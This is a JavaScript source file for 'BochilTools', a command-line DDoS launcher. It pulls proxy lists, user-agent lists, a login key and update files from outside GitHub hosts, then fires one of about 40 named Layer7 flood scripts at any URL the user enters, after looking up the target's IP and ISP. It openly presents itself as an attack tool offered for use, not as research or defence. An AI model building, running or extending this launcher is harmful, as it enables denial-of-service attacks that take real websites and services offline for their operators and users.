#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.0.0'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀BochilTools ${version}
⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀Owner: BochilTeam
⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀Vip: Yes
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀Telegram: @BochilTeam
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀Expired: ∞
⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀
Welcome to my DDoS tools!!! you can contact me if you find a bug⠀
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://github.com/wanz8creator/gapenting/raw/refs/heads/main/proxy.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://github.com/wanz8creator/gapenting/raw/refs/heads/main/ua.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/wanz8creator/gapenting/refs/heads/main/BochilTeamVersi.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/wanz8creator/gapenting/refs/heads/main/bochilteamkey.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31mBochilTeam Security\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To Bochil Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type "menu" For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`|Target|Methods|Duration|Since|
|${process.target}|${process.methods}|${process.duration}|${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n|`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇
                          ⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀
⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀
⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆
⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛
⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀
[===============ATTACK WILL BE LAUNCHED===============]
∆Attack Information:
Target   : ${target}
Duration  : ${duration}
Methods  : ${methods}

€Target Detail:
AS       : ${result.as}
Ip       : ${result.query}
ISP      : ${result.isp}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'night-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 60 proxy.txt flood`)
	sigma()
  } else if (methods === 'ghostxtls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'ghostxstorm') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'ghostxbypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'cookie') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20 proxy.txt`)
	sigma()
  } else if (methods === 'ghostxflood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'anus-h2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'uam') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'medusa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'night-bypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt bypass`)
	sigma()
  } else if (methods === 'tlsv1') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'boom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10`)
	sigma()
  } else if (methods === 'tornado') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'xlamper-bom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10`)
	sigma()
  } else if (methods === 'nuke') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'pidoras') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'black') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20`)
	sigma()
  } else if (methods === 'xlamper') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 20 proxy.txt`)
	sigma()
  } else if (methods === 'inferno') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'killer') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'pluto') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tls-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'lezkill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'xyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'hold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'vxx') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'geckold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'mix') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (methods === 'mixsyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (methods === 'glory') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'skynet-tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'tls-vip') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
  } else if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushMonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'strike') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/Xlamper/root-/refs/heads/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By BochilTeam

Thx To:
Wanzz ( Support Methods )
BochilTeam ( Pengembang )
`
permen.question('[\x1b[1m\x1b[31mBochilTeam Tools > Console\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
| methods      | show list of available methods
| attack       | launch ddos attack
| monitor      | show monitor attack
| credits      | show creator of these tools
| news         | show news update
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[==================METHODS DDoS==================]
||Total Layer7: 40 Methods || Total Layer4: Coming Soon
§§ flood      || Layer7 (Best Methods)
§§ tls        || Layer7
§§ strike     || Layer7
§§ kill       || Layer7
§§ raw        || Layer7
§§ bypass     || Layer7
§§ thunder    || Layer7 (Best Methods)
§§ storm      || Layer7 (Best Methods)
§§ rape       || Layer7
§§ destroy    || Layer7
§§ slim       || Layer7
§§ skynet-tls || Layer7 (Best Methods)
§§ glory      || Layer7
§§ mixsyn     || Layer7
§§ mix        || Layer7
§§ vxx        || Layer7
§§ geckold    || Layer7
§§ lezkill    || Layer7
§§ tls-vip    || Layer7
§§ tls-bypass || Layer7
§§ killer     || Layer7
§§ black      || Layer7
§§ xlamper    || Layer7
§§ boom       || Layer7
§§ inferno    || Layer7
§§ xlamper-bom|| Layer7 
§§ tornado    || Layer7
§§ tlsv1      || Layer7
§§ medusa     || Layer7
§§ anus-h2    || Layer7
§§ uam        || Layer7
§§ http-x     || Layer7 
§§ ghostxflood|| Layer7 
§§ pluto      || Layer7 
§§ ghostxbypas|| Layer7 
§§ hold       || Layer7 (New)
§§ cookie     || Layer7 (New)
§§ xyn        || Layer7 (New) + (Best Methods)
§§ nuke       || Layer7 (New) + (Best Methods)
§§ pidoras    || Layer7 (New) + (Best Methods)
§§ ghostxglory|| Layer7 (Owner Only)
§§ night-flood|| Layer7 (Owner Only)
§§ night-bypas|| Layer7 (Owner Only)
§§ ghostxtls  || Layer7 (Owner Only)
§§ ghostxstorm|| Layer7 (Owner Only)
[==================METHODS DDoS==================]
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()